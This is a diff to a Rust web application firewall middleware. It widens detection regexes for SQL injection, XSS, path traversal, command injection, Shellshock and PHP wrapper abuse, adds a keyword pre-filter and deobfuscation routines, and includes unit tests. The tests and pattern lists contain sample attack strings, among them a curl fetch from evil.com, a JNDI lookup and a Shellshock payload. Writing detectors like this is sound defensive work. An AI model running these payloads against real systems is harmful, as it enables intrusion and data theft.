@@ -11,6 +11,7 @@ use axum::{
 };
 use once_cell::sync::Lazy;
 use regex::Regex;
+use aho_corasick::AhoCorasick;
 
 use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
 
@@ -238,28 +239,28 @@ pub fn get_client_ip(headers: &HeaderMap, connect_info: Option<&ConnectInfo<Sock
 /// SQL Injection — covers UNION-based, boolean-based, time-based blind, stacked queries
 static SQLI_REGEX: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
-        r"(?i)(union[\s\+/\*]+(?:all[\s\+/\*]+)?select|select[\s\S]+from[\s\S]+where|insert[\s\+]+into|delete[\s\+]+from|drop[\s\+]+(?:table|database|schema)|update[\s\S]+set[\s\S]+where|or[\s\+]+[\d']+[\s\+]*=[\s\+]*[\d']+|and[\s\+]+[\d']+[\s\+]*=[\s\+]*[\d']+|--|#|/\*[\s\S]*?\*/|xp_cmdshell|information_schema|sleep\(\s*\d+\s*\)|benchmark\(|waitfor[\s\+]+delay|load_file\(|into[\s\+]+outfile|group[\s\+]+by[\s\+]+.*having)"
+        r#"(?i)(?:union[\s\S]*?select|select[\s\S]*?from|insert[\s\S]*?into|delete[\s\S]*?from|drop[\s\S]*?(?:table|database|schema)|update[\s\S]*?set|group[\s\S]*?by[\s\S]*?having|dbms_pipe\.receive_message|xp_cmdshell|information_schema\.|sys\.user_tables|sleep\(\s*\d+\s*\)|benchmark\([\s\S]*?,[\s\S]*?\)|waitfor[\s\+]+delay|load_file\s*\(|into[\s\+]+outfile|--|#|/\*[\s\S]*?\*/|['\"]\s*(?:or|and|xor|not|like|regexp)\s*['\"].*?=.*?['\"]|['\"]\s*=\s*['\"]|\b(?:or|and|xor)\b[\s\S]*?\b(?:true|false|null|\d+)\b\s*=\s*\b(?:true|false|null|\d+)\b|\b(?:or|and|xor)\b[\s\S]*?[=<>~])"#
     ).unwrap()
 });
 
 /// XSS — covers reflected, DOM, attribute injection, data URIs
 static XSS_REGEX: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
-        r#"(?i)(<script[\s>]|<\/script>|javascript\s*:|vbscript\s*:|on\w+\s*=\s*['"]?[^'">\s]|alert\s*\(|confirm\s*\(|prompt\s*\(|document\.cookie|document\.write|window\.location|<iframe|<object|<svg[\s>]|<embed|<link\s+rel\s*=\s*['"]stylesheet['"]|data\s*:\s*text/html|eval\s*\(|<form\s+action\s*=)"#
+        r#"(?i)(<script[\s\S]*?>|<\/script>|<iframe|<object|<embed|<svg|<img|<body|<link|<form|<meta|<style|<html|<details|<audio|<video|<math|javascript\s*:|vbscript\s*:|data\s*:\s*text/(?:html|xml)|on[a-z]+[\s\x0b]*=[\s\S]*?['\"`\s]|alert\s*\(|confirm\s*\(|prompt\s*\(|eval\s*\(|setTimeout\s*\(|setInterval\s*\(|new\s+Function\s*\(|document\.(?:cookie|write|location)|window\.location|atob\s*\(|btoa\s*\(|String\.fromCharCode)"#
     ).unwrap()
 });
 
-/// Path Traversal — covers plain, encoded, double-encoded
+/// Path Traversal — covers directory traversal and sensitive paths
 static PATH_TRAVERSAL_REGEX: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
-        r"(?i)(\.\./|\.\.\\|%2e%2e[%/\\]|%252e%252e|\.%2e|%2e\.|/etc/passwd|/etc/shadow|/etc/hosts|/proc/self|/win\.ini|/boot\.ini|\x00)"
+        r"(?i)(?:\.\./|\.\.\\|/\.\.|\x00|/etc/(?:passwd|shadow|hosts|group|issue)|/proc/(?:self|version|cmdline|environ)|/var/log/|win\.ini|system\.ini|boot\.ini|windows/system32/config/)"
     ).unwrap()
 });
 
 /// Remote Code Execution — shell commands, PHP code injection, template injection
 static RCE_REGEX: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
-        r"(?i)(/bin/(?:bash|sh|zsh|ksh)|cmd\.exe|powershell\.exe|curl\s+[hf]|wget\s+[hf]|nc\s+-|netcat\s|sh\s+-c\s|bash\s+-c\s|exec\s*\(|system\s*\(|passthru\s*\(|shell_exec\s*\(|popen\s*\(|eval\s*\(|base64_decode\s*\(|phpinfo\s*\(|\{\{.*\}\}|\$\{.*\}|`[^`]+`)"
+        r"(?i)(?:/bin/(?:bash|sh|zsh|ksh|csh)|cmd\.exe|powershell\.exe|pwsh\.exe|curl\s+.*?http|wget\s+.*?http|nc\s+-|netcat\s|sh\s+-c|bash\s+-c|exec\s*\(|system\s*\(|passthru\s*\(|shell_exec\s*\(|popen\s*\(|proc_open\s*\(|eval\s*\(|assert\s*\(|base64_decode\s*\(|phpinfo\s*\(|`[^`]+`|\$\([^)]+\)|\{\{[\s\S]*?\}\}|\$\{\{[\s\S]*?\}\}|\$\{[\s\S]*?\}|\b(?:whoami|uname\s+-a|id\s+-[a-z]|ifconfig|ip\s+a)\b)"
     ).unwrap()
 });
 
@@ -277,6 +278,20 @@ static LOG4SHELL_REGEX: Lazy<Regex> = Lazy::new(|| {
     ).unwrap()
 });
 
+/// Shellshock — bash environment variable command injection
+static SHELLSHOCK_REGEX: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r"(?i)\(\)\s*\{\s*[:\s;]+[^\}]*\};"
+    ).unwrap()
+});
+
+/// LFI / PHP wrapper exploits
+static LFI_WRAPPERS_REGEX: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r"(?i)(php://(?:filter|input|temp|data)|data://text/plain|expect://)"
+    ).unwrap()
+});
+
 /// Scanner/Attack tool User-Agents
 static SCANNER_UA_REGEX: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
@@ -284,19 +299,233 @@ static SCANNER_UA_REGEX: Lazy<Regex> = Lazy::new(|| {
     ).unwrap()
 });
 
+static WAF_KEYWORDS: Lazy<AhoCorasick> = Lazy::new(|| {
+    let patterns = vec![
+        // SQLi
+        "union", "select", "insert", "delete", "drop", "update", "xp_cmdshell",
+        "information_schema", "sleep(", "benchmark(", "waitfor", "load_file", "into outfile",
+        "--", "/*", "*/", "#", "=",
+        // XSS
+        "<script", "</script>", "javascript:", "vbscript:", "alert(", "confirm(", "prompt(",
+        "document.cookie", "document.write", "window.location", "<iframe", "<object",
+        "<svg", "<embed", "<link", "data:", "eval(", "<form",
+        // Path Traversal
+        "..", "/etc/", "/proc/", "/var/log/", "win.ini", "system.ini", "boot.ini", "windows/",
+        // RCE
+        "/bin/", "cmd.exe", "powershell.exe", "pwsh.exe", "curl", "wget", "nc", "netcat",
+        "exec(", "system(", "passthru(", "shell_exec(", "popen(", "proc_open(", "eval(", "assert(",
+        "base64_decode", "phpinfo(", "{{", "${", "$(", "`", "() {", "whoami", "uname", "ifconfig",
+        // SSRF
+        "127.0.0.1", "localhost", "0.0.0.0", "::1", "169.254.169.254", "metadata.google",
+        "100.100.100.200", "192.168.", "10.", "172.", "file://", "gopher://", "dict://",
+        "ftp://", "sftp://",
+        // Log4Shell
+        "jndi:",
+        // PHP wrappers / LFI
+        "php://",
+    ];
+    AhoCorasick::new(patterns).unwrap()
+});
+fn decode_unicode_and_hex_escapes(s: &str) -> String {
+    use std::fmt::Write;
+    let mut result = String::new();
+    let mut chars = s.chars().peekable();
+    while let Some(c) = chars.next() {
+        if c == '\\' {
+            if let Some(&next_c) = chars.peek() {
+                if next_c == 'u' || next_c == 'U' {
+                    chars.next(); // consume 'u'
+                    let mut hex = String::new();
+                    for _ in 0..4 {
+                        if let Some(&h) = chars.peek() {
+                            if h.is_ascii_hexdigit() {
+                                hex.push(chars.next().unwrap());
+                            } else {
+                                break;
+                            }
+                        }
+                    }
+                    if hex.len() == 4 {
+                        if let Ok(code) = u32::from_str_radix(&hex, 16) {
+                            if let Some(decoded_char) = char::from_u32(code) {
+                                result.push(decoded_char);
+                                continue;
+                            }
+                        }
+                    }
+                    result.push('\\');
+                    result.push(next_c);
+                    result.write_str(&hex).unwrap();
+                    continue;
+                } else if next_c == 'x' || next_c == 'X' {
+                    chars.next(); // consume 'x'
+                    let mut hex = String::new();
+                    for _ in 0..2 {
+                        if let Some(&h) = chars.peek() {
+                            if h.is_ascii_hexdigit() {
+                                hex.push(chars.next().unwrap());
+                            } else {
+                                break;
+                            }
+                        }
+                    }
+                    if hex.len() == 2 {
+                        if let Ok(code) = u32::from_str_radix(&hex, 16) {
+                            if let Some(decoded_char) = char::from_u32(code) {
+                                result.push(decoded_char);
+                                continue;
+                            }
+                        }
+                    }
+                    result.push('\\');
+                    result.push(next_c);
+                    result.write_str(&hex).unwrap();
+                    continue;
+                }
+            }
+        }
+        result.push(c);
+    }
+    result
+}
+
+fn decode_html_entities(s: &str) -> String {
+    let mut result = String::new();
+    let mut chars = s.chars().peekable();
+    while let Some(c) = chars.next() {
+        if c == '&' {
+            let mut entity = String::new();
+            let mut matched = false;
+            while let Some(&next_c) = chars.peek() {
+                if next_c == ';' {
+                    chars.next(); // consume ';'
+                    matched = true;
+                    break;
+                } else if next_c.is_ascii_alphanumeric() || next_c == '#' {
+                    entity.push(chars.next().unwrap());
+                } else {
+                    break;
+                }
+            }
+            if matched {
+                if entity.starts_with("#x") || entity.starts_with("#X") {
+                    if let Ok(code) = u32::from_str_radix(&entity[2..], 16) {
+                        if let Some(decoded_char) = char::from_u32(code) {
+                            result.push(decoded_char);
+                            continue;
+                        }
+                    }
+                } else if entity.starts_with('#') {
+                    if let Ok(code) = entity[1..].parse::<u32>() {
+                        if let Some(decoded_char) = char::from_u32(code) {
+                            result.push(decoded_char);
+                            continue;
+                        }
+                    }
+                } else {
+                    match entity.as_str() {
+                        "lt" => { result.push('<'); continue; }
+                        "gt" => { result.push('>'); continue; }
+                        "amp" => { result.push('&'); continue; }
+                        "quot" => { result.push('"'); continue; }
+                        "apos" => { result.push('\''); continue; }
+                        _ => {}
+                    }
+                }
+            }
+            result.push('&');
+            result.push_str(&entity);
+            if matched {
+                result.push(';');
+            }
+            continue;
+        }
+        result.push(c);
+    }
+    result
+}
+
+fn replace_sql_comments(s: &str) -> String {
+    let mut result = String::new();
+    let mut chars = s.chars().peekable();
+    while let Some(c) = chars.next() {
+        if c == '/' {
+            if let Some(&'*') = chars.peek() {
+                chars.next(); // consume '*'
+                let mut found_end = false;
+                while let Some(comment_char) = chars.next() {
+                    if comment_char == '*' {
+                        if let Some(&'/') = chars.peek() {
+                            chars.next(); // consume '/'
+                            found_end = true;
+                            break;
+                        }
+                    }
+                }
+                if found_end {
+                    result.push(' ');
+                } else {
+                    result.push_str("/*");
+                }
+                continue;
+            }
+        }
+        result.push(c);
+    }
+    result
+}
+
+fn deobfuscate(input: &str) -> String {
+    let mut current = input.to_string();
+    
+    // 1. Recursive URL decoding (up to 3 iterations)
+    for _ in 0..3 {
+        if let Ok(decoded) = urlencoding::decode(&current) {
+            let decoded_str = decoded.into_owned();
+            if decoded_str == current {
+                break;
+            }
+            current = decoded_str;
+        } else {
+            break;
+        }
+    }
+    
+    // 2. Decode Unicode escapes \uXXXX and \xXX
+    current = decode_unicode_and_hex_escapes(&current);
+    
+    // 3. Decode HTML entities (e.g. &lt; -> <, &#x3c; -> <)
+    current = decode_html_entities(&current);
+    
+    // 4. Normalize spacing and replace comments with space
+    current = replace_sql_comments(&current);
+    
+    current
+}
+
 pub struct WafMatch {
     pub reason: &'static str,
     pub severity: &'static str,
 }
 
 pub fn is_malicious(input: &str, check_ssrf: bool) -> Option<WafMatch> {
-    // Decode percent encoding to catch evasion attempts
-    let decoded = urlencoding::decode(input)
-        .map(|cow| cow.into_owned())
-        .unwrap_or_else(|_| input.to_string());
+    // Deobfuscate input to catch evasion attempts (recursive URL decode, HTML entities decode, SQL comments removal)
+    let decoded = deobfuscate(input);
+
+    // --- Fast-Path: Aho-Corasick Pre-Filter ---
+    let decoded_lower = decoded.to_lowercase();
+    if !WAF_KEYWORDS.is_match(&decoded_lower) {
+        return None;
+    }
 
     if LOG4SHELL_REGEX.is_match(&decoded) {
         return Some(WafMatch { reason: "Log4Shell / JNDI Injection", severity: "critical" });
+    }
+    if SHELLSHOCK_REGEX.is_match(&decoded) {
+        return Some(WafMatch { reason: "Shellshock Command Injection", severity: "critical" });
+    }
+    if LFI_WRAPPERS_REGEX.is_match(&decoded) {
+        return Some(WafMatch { reason: "LFI / PHP Wrapper Exploit Pattern", severity: "high" });
     }
     if SQLI_REGEX.is_match(&decoded) {
         return Some(WafMatch { reason: "SQL Injection Pattern", severity: "high" });
@@ -741,17 +970,25 @@ pub(crate) async fn waf_middleware(
     let mut body_bytes = None;
     let mut body_opt = Some(body);
 
-    // ZenoPanel's own internal API and asset paths are always exempt from WAF.
-    // These endpoints are already protected by JWT authentication internally.
-    const ZENOPANEL_EXEMPT_PREFIXES: &[&str] = &[
-        "/api/",
-        "/assets/",
-        "/public/",
-        "/storage/",
-    ];
-    let is_zenopanel_internal = ZENOPANEL_EXEMPT_PREFIXES.iter().any(|p| path.starts_with(p));
+    // Determine if the request matches an active proxy rule.
+    // If it does NOT match any proxy rule, it is destined for ZenoPanel's own admin panel / UI / API,
+    // which should be exempt from WAF to prevent blocking panel operations.
+    let host_header = headers.get("Host")
+        .and_then(|h| h.to_str().ok())
+        .unwrap_or("");
+    let (host, request_port_opt) = crate::proxyman::parse_host_port(host_header);
+    let request_port = request_port_opt.unwrap_or(80);
 
-    if state.waf_enabled.load(std::sync::atomic::Ordering::Relaxed) && !is_zenopanel_internal {
+    let mut is_proxied = false;
+    let mut is_waf_enabled_for_proxy = true;
+    if let Some(rule) = state.proxy_manager.match_rule(&host, request_port, &path).await {
+        is_proxied = true;
+        is_waf_enabled_for_proxy = rule.waf_enabled;
+    }
+
+    let is_zenopanel_internal = !is_proxied;
+
+    if state.waf_enabled.load(std::sync::atomic::Ordering::Relaxed) && !is_zenopanel_internal && is_waf_enabled_for_proxy {
         // 2a. Scanner bot detection via User-Agent
         if is_scanner_bot(&user_agent) {
             block_reason = Some("Known Attack Tool / Scanner Bot");
@@ -890,4 +1127,102 @@ pub(crate) async fn waf_middleware(
         h.insert("Referrer-Policy", "strict-origin-when-cross-origin".parse().unwrap());
     }
     Response::from_parts(resp_parts, resp_body)
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn test_waf_is_malicious() {
+        // Safe inputs
+        assert!(is_malicious("hello world", true).is_none());
+        assert!(is_malicious("user_id=123", true).is_none());
+        assert!(is_malicious("https://google.com/search?q=rust", true).is_none());
+
+        // SQLi inputs
+        assert!(is_malicious("select * from users where id = 1", true).is_some());
+        assert!(is_malicious("1' or '1'='1", true).is_some());
+        assert!(is_malicious("union select 1,2,3", true).is_some());
+
+        // XSS inputs
+        assert!(is_malicious("<script>alert(1)</script>", true).is_some());
+        assert!(is_malicious("javascript:alert(1)", true).is_some());
+
+        // Path traversal
+        assert!(is_malicious("../../etc/passwd", true).is_some());
+        assert!(is_malicious("/etc/hosts", true).is_some());
+
+        // SSRF
+        assert!(is_malicious("http://169.254.169.254/latest/meta-data", true).is_some());
+        assert!(is_malicious("gopher://127.0.0.1:1234/test", true).is_some());
+
+        // Log4Shell
+        assert!(is_malicious("${jndi:ldap://evil.com/a}", true).is_some());
+    }
+
+    #[test]
+    fn test_waf_prefilter_performance() {
+        let safe_input = "This is a completely normal request with no special query parameters or suspicious strings.";
+        let start = std::time::Instant::now();
+        for _ in 0..10_000 {
+            let _ = is_malicious(safe_input, true);
+        }
+        let duration = start.elapsed();
+        println!("Elapsed time for 10,000 WAF runs on safe input: {:?}", duration);
+    }
+
+    #[test]
+    fn test_waf_deobfuscate() {
+        // Double URL encoding
+        assert_eq!(deobfuscate("hello%2520world"), "hello world");
+        
+        // Unicode escapes
+        assert_eq!(deobfuscate("hello\\u0020world"), "hello world");
+        assert_eq!(deobfuscate("\\u003cscript\\u003e"), "<script>");
+        
+        // Hex escapes
+        assert_eq!(deobfuscate("hello\\x20world"), "hello world");
+        
+        // HTML entities
+        assert_eq!(deobfuscate("&lt;script&gt;"), "<script>");
+        assert_eq!(deobfuscate("&#x3c;script&#x3e;"), "<script>");
+        assert_eq!(deobfuscate("&#60;script&#62;"), "<script>");
+        
+        // SQL comments bypass
+        assert_eq!(deobfuscate("union/*comment*/select"), "union select");
+        assert_eq!(deobfuscate("select/**/from"), "select from");
+    }
+
+    #[test]
+    fn test_waf_strengthened_rules() {
+        // Obfuscated SQLi
+        assert!(is_malicious("union/**/select 1,2", true).is_some());
+        assert!(is_malicious("union%20select", true).is_some());
+        assert!(is_malicious("union%2520select", true).is_some());
+        assert!(is_malicious("1' or 'a'='a", true).is_some());
+        assert!(is_malicious("1 xor 2=2", true).is_some());
+        assert!(is_malicious("select * from users group by id having 1=1", true).is_some());
+        
+        // HTML5 Event handler & tags (XSS)
+        assert!(is_malicious("<img src=x onerror=alert(1)>", true).is_some());
+        assert!(is_malicious("<svg onload=alert(document.cookie)>", true).is_some());
+        assert!(is_malicious("javascript:eval(String.fromCharCode(97))", true).is_some());
+        
+        // Path Traversal / LFI
+        assert!(is_malicious("/etc/issue", true).is_some());
+        assert!(is_malicious("/proc/self/environ", true).is_some());
+        assert!(is_malicious("system.ini", true).is_some());
+        
+        // Shellshock
+        assert!(is_malicious("() { :; }; echo 'evil'", true).is_some());
+        
+        // RCE
+        assert!(is_malicious("$(whoami)", true).is_some());
+        assert!(is_malicious("`uname -a`", true).is_some());
+        assert!(is_malicious("curl http://evil.com/shell.sh", true).is_some());
+        
+        // LFI / PHP wrapper
+        assert!(is_malicious("php://filter/read=convert.base64-encode/resource=index.php", true).is_some());
+    }
 }
